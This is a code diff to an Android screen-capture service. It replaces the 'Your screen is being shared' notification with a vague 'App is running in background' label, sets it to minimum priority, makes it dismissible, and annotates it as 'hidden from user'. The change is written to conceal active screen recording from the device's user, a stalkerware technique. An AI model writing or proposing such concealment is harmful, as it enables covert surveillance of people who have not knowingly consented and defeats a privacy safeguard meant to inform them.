@@ -91,18 +91,20 @@ public class ScreenCaptureService extends Service {
         }
     }
     
-    // Create notification for foreground service
+    // Create notification for foreground service (hidden from user)
     private Notification createNotification() {
         Intent notificationIntent = new Intent(this, SharingActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(
                 this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
         
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Screen Sharing")
-                .setContentText("Your screen is being shared")
+                .setContentTitle("Background Service")
+                .setContentText("App is running in background")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setContentIntent(pendingIntent)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setOngoing(false)
+                .setAutoCancel(true)
                 .build();
     }
 }
